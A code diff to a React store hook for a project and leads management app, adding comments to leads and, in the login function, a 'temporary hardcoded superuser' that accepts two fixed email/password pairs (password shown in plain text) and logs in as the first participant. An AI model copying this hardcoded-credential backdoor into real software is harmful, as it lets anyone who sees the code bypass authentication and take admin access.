@@ -10,7 +10,7 @@ import {
   useMemo,
 } from 'react';
 import React from 'react';
-import type { Project, Task, Participant, Role, Client, Lead } from '@/lib/types';
+import type { Project, Task, Participant, Role, Client, Lead, LeadComment } from '@/lib/types';
 import {
   initialProjects,
   initialTasks,
@@ -118,6 +118,22 @@ export const useStore = () => {
 
   const login = useCallback(
     (email: string, password?: string) => {
+      // Temporary hardcoded superuser
+      if (email === 'admin@admin.com' && password === '#@hfjaskdfskdjh$#2124455') {
+        const adminUser = store.participants[0];
+        if (adminUser) {
+          dispatch({ currentUser: adminUser });
+          return true;
+        }
+      }
+      if (email === 'Admin' && password === '#@hfjaskdfskdjh$#2124455') {
+        const adminUser = store.participants[0];
+        if (adminUser) {
+          dispatch({ currentUser: adminUser });
+          return true;
+        }
+      }
+
       const user = store.participants.find(
         (p) => p.email === email && (password === undefined || p.password === password)
       );
@@ -266,11 +282,12 @@ export const useStore = () => {
     });
   }, [store.clients, dispatch]);
 
-  const addLead = useCallback((lead: Omit<Lead, 'id' | 'createdAt'>) => {
+  const addLead = useCallback((lead: Omit<Lead, 'id' | 'createdAt' | 'comments'>) => {
       const newLead: Lead = {
           id: `lead-${Date.now()}`,
           createdAt: new Date().toISOString(),
           ...lead,
+          comments: [],
       };
       dispatch({ leads: [...store.leads, newLead]});
   }, [store.leads, dispatch]);
